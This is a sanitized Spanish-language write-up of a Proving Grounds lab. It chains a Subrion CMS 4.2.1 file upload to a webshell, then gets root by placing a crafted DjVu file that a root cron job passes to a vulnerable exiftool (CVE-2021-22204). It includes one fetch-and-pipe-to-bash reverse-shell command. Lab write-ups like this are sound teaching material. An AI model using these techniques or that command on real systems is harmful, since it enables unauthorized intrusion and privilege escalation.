# Exfiltrated (Proving Grounds) — Subrion upload + exiftool cron (CVE-2021-22204)

> **Writeup sanitizado.** Credenciales y flags redactadas. Metodología y razonamiento, sin regalar la sala.

**Tipo:** Linux · Intermediate
**Cadena:** `Subrion CMS 4.2.1 → panel admin → arbitrary file upload (RCE) → www-data → cron de root con exiftool sobre dir escribible → CVE-2021-22204 → root`

---

## 1. Recon
- **22** SSH · **80** Apache → redirige a `exfiltrated.offsec` (añadir vhost a `/etc/hosts`).
- La web es **Subrion CMS**; `/panel/` revela la versión **4.2.1**.
- `robots.txt` lista `/panel/ /cron/ /backup/ ...`

## 2. Foothold — elegir el exploit correcto
`searchsploit subrion` devuelve muchos para 4.2.1. En vez de probarlos a ciegas, **triaje por lo que dan y lo que piden**:

| Exploit | Da | Pide | ¿Sirve en caja sola? |
|---|---|---|---|
| XSS / CSRF (varios) | ejecutar en el navegador de otro | una **víctima** | ❌ |
| **Arbitrary File Upload** | **RCE** (webshell) | estar **autenticado** en el panel | ✅ |

> **Lección — descarta en segundos.** XSS/CSRF necesitan interacción de una víctima → inútiles en una máquina sola. Lo que da ejecución directa es siempre el camino.

El upload pide auth. En máquinas de este estilo las credenciales del panel suelen ser **triviales** → se entra con un usuario/clave por defecto. Con el panel, el exploit de subida da **shell como `www-data`** (cuenta de servicio).

### Estabilizar: no se "upgradea" un webshell
Un webshell es ejecución por HTTP: **no es interactivo**, así que `python3 -c 'pty.spawn()'` o `script` se cuelgan. Primero hay que conseguir una **reverse shell** y luego estabilizarla.
→ Uso mi técnica [**Magic Rev Shell**](../techniques/magic-rev-shell.md) (`curl http://IP/shell.sh | bash`), que esquiva el destrozo de comillas del webshell, y después `script -qc /bin/bash /dev/null`.

## 3. Privesc — "root procesa mi input"
Enumeración de cron (más fiable leer la crontab que esperar a pspy):
```bash
cat /etc/crontab
# * * * * *  root  bash /opt/image-exif.sh
```
El script (no editable) ejecuta **`exiftool` como root** sobre **todas las imágenes** de un directorio de subidas **donde `www-data` puede escribir**.

> **Patrón clave:** no necesito editar el script. Un proceso de **root** que **parsea ficheros que yo controlo** es RCE si el parser es vulnerable. *"Algo que ejecuta como root + algo donde puedo escribir = WIN."*

`exiftool` es de una versión afectada por **CVE-2021-22204**: ejecución de código al parsear **metadatos DjVu** maliciosos. Se construye una imagen trucada (con `djvumake`) que incrusta un comando en los metadatos, se deja en el directorio de subidas, y en el siguiente tick del cron **exiftool la procesa como root** → shell de root.

> Detalle útil: exiftool identifica el tipo por **contenido**, no por extensión → un DjVu renombrado a `.jpg` dispara el bug igual (y pasa el filtro del cron que busca `jpg`).

## Qué me llevo
- **Triaje de exploits** por lo que dan/piden: XSS/CSRF = víctima; upload/RCE = directo.
- **Webshell ≠ shell interactiva:** primero reverse (Magic Rev Shell), luego TTY.
- **pspy es complemento, no oráculo:** `cat /etc/crontab` + leer el script del cron es la verdad determinista.
- **Parser vulnerable + directorio escribible procesado por root = root.** Aquí, exiftool viejo (CVE-2021-22204). El mismo patrón aplica a ImageMagick, ffmpeg, o librerías importadas por un script de root.

<sub>⚠️ Contenido educativo sobre un laboratorio autorizado. Flags y credenciales redactadas.</sub>
